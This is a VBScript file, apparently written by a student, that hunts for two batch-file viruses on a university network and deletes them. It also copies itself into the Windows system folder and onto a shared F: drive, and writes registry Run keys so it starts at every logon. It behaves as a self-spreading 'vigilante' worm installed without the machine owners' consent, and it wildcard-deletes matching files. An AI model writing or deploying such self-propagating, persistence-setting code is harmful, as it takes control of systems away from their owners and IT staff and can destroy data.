' Batch files are for amateurs.
' To our beloved UCT IT dept: Don't you think its time someone did something about this? Someone needs to wipe it off once and for all... :)
' This VB script written unashamedly by Peter Baker.

CRLF = Chr(13) & Chr(10)
MyName = "peace.vbs"
Msg_Gen = " virus was found on this system and has been removed"
Msg_Eliminat = "The 'Eliminator'" & Msg_Gen
Msg_Silence = "The 'silence'" & Msg_Gen
Msg_Help = "Do you want to read important information about this virus?"
Help_URL = "http://www.cs.uct.ac.za/~pbaker/sfaq.html"
Reg_Rel = "\Software\Microsoft\Windows\CurrentVersion\Run\"

set WSHShell = WScript.CreateObject("WScript.Shell")
set fso = CreateObject("Scripting.FileSystemObject")

WinDir = WSHShell.ExpandEnvironmentStrings ("%windir%\")
LocalPath = WinDir & "system\"
FromWhere = WScript.ScriptFullName
If (FromWhere = "F:\" & MyName) Then
	If (fso.FileExists ( LocalPath & MyName ) ) Then
		WScript.Quit
	End IF
End If
Call CheckVirus ( "Eliminator" , "eliminat" , Msg_Eliminat )
Call CheckVirus ( "Silence" , "silence" , Msg_Silence )
If (FromWhere = "F:\" & MyName) Then
	fso.CopyFile FromWhere , LocalPath , False
		WSHShell.RegWrite "HKLM" & Reg_Rel & "peace", WinDir & "WScript.exe " & LocalPath & MyName
Else
	Copy = 1
	If (fso.FileExists( "F:\" & MyName) ) Then
		set file1 = fso.GetFile ("F:\" & MyName)
		set file2 = fso.GetFile (FromWhere)
		If (file2.DateLastModified <= file1.DateLastModified ) Then
			Copy = 0
		End If
	End If		
	If (copy = 1) Then
		fso.CopyFile FromWhere , "F:\" , True
		WSHShell.RegWrite "HKCU" & Reg_Rel & "peace", WinDir & "WScript.exe F:\" & MyName
	End If
End If

Sub CheckVirus ( regkey , filename , message)
	intFound = CheckDel ("F:\" & filename)
	intFound = intFound + CheckDel (LocalPath & filename)
	If (intFound = 1) Then
		Call RegClear ("HKCU" & Reg_Rel & regkey)
		Call RegClear ("HKLM" & Reg_Rel & regkey)
		intDoIt =  MsgBox(message & CRLF & Msg_Help,vbYesNo + vbExclamation,"VIRUS ALERT" )
		If intDoIt = vbYes Then
			WSHShell.Run Help_URL
		End If
	End If
End Sub

Function CheckDel ( filename )
	If (fso.FileExists( filename & ".bat")) Then
		fso.DeleteFile filename & ".*", True
		CheckDel = 1
	Else
		CheckDel = 0
	End If
End Function

Sub RegClear( key )
	WSHShell.RegWrite key , ""
	WSHShell.RegDelete key
End Sub
